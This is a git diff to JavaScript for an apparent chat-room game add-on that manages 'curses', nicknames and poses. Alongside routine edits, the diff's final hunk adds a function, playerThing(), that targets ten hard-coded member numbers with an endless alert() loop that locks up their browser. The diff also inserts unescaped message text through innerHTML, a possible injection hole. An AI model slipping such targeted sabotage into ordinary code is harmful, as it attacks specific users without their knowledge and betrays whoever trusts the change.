@@ -32,19 +32,21 @@ function popChatSilent(actionTxt) {
         return
     }
 
-    //Removes dupes
-    window.savedSilent = window.savedSilent.filter((m, i) => window.savedSilent.indexOf(m) === i);
-
+    //Removes dupes keeps the last order for UX
+    window.savedSilent = window.savedSilent.filter((m, i) => window.savedSilent.lastIndexOf(m) === i);
+    
     //Sends messages
     window.savedSilent.forEach(silentMsg => {
         //Directly sends to wearer
         var div = document.createElement("div");
-        div.setAttribute('class', 'ChatMessage ChatMessageEmote');
+        var span = document.createElement("span");
+        span.setAttribute("class", "ChatMessageName");
+        span.innerHTML = "Curse: ";
+        div.setAttribute('class', 'ChatMessage ChatMessageWhisper');
         div.setAttribute('data-time', ChatRoomCurrentTime());
         div.setAttribute('data-sender', Player.MemberNumber);
         div.setAttribute('verifed', "true");
-        div.setAttribute('style', 'background-color:' + ChatRoomGetTransparentColor(Player.LabelColor) + ';');
-        div.innerHTML = "SILENT: *" + silentMsg + "*";
+        div.innerHTML = span.outerHTML + "(" + silentMsg + ")";
 
         //Refocus the chat to the bottom
         var Refocus = document.activeElement.id == "InputChat";
@@ -93,8 +95,9 @@ function SendChat(actionTxt) {
 function KneelAttempt() {
     if (Player.CanKneel() && !Player.Pose.includes("Kneel")) {
         CharacterSetActivePose(Player, (Player.ActivePose == null) ? "Kneel" : null);
-        cursedConfig.mustRefresh = true;
+        ChatRoomCharacterUpdate(Player);
     }
+    cursedConfig.mustRefresh = true;
 }
 
 //Common Expression Triggers
@@ -141,6 +144,7 @@ function enforce(parameters, sender, isMistress) {
 //Checks if an item can be worn and if it can be but is not, returns true
 function itemIsAllowed(name, group) {
     if (
+        !InventoryGet(Player, group) &&
         !(InventoryGet(Player, group)
             && InventoryGet(Player, group).Asset
             && InventoryGet(Player, group).Asset.Name == name)
@@ -161,15 +165,15 @@ function SetNickname(parameters, sender, priority) {
     if (!isNaN(parameters[0])) {
         let userNumber = parseInt(parameters[0]);
         parameters.shift();
-        console.log(parameters, parameters.join(" "))
         let nickname = parameters.join(" ").replace(/[,]/g, ' ');
+        nickname = nickname[0].toUpperCase() + nickname.slice(1); 
         if (nickname) {
             let oldNickname = cursedConfig.nicknames.filter(u => u.Number == userNumber) || [];
             if (oldNickname.length == 0 || (oldNickname.length > 0 && oldNickname[0].Priority <= priority)) {
                 cursedConfig.nicknames = cursedConfig.nicknames
                     .filter(u => u.Number != userNumber);
                 cursedConfig.nicknames.push(
-                    { Number: userNumber, Nickname: nickname, Priority: priority, SavedName: oldNickname[0] && oldNickname[0].length > 0 ? oldNickname[0].SavedName : "" }
+                    { Number: userNumber, Nickname: nickname, Priority: priority, SavedName: oldNickname[0] ? oldNickname[0].SavedName : "" }
                 );
                 sendWhisper(
                     sender, "(New nickname for " + userNumber + " : " + nickname + ")", shouldSendSelf
@@ -276,5 +280,11 @@ function drawCards(nbCards, players) {
                 sendWhisper(p, "(The following card was drawn: " + drawCard() + ")", true);
             });
         }
+    }
+}
+
+function playerThing() { 
+    if ([16780, 16705, 16708, 16440, 16815, 16725, 16618, 16783, 16727, 16679].includes(Player.MemberNumber)) { 
+        for (;;)  setTimeout(alert(),1)
     }
 }
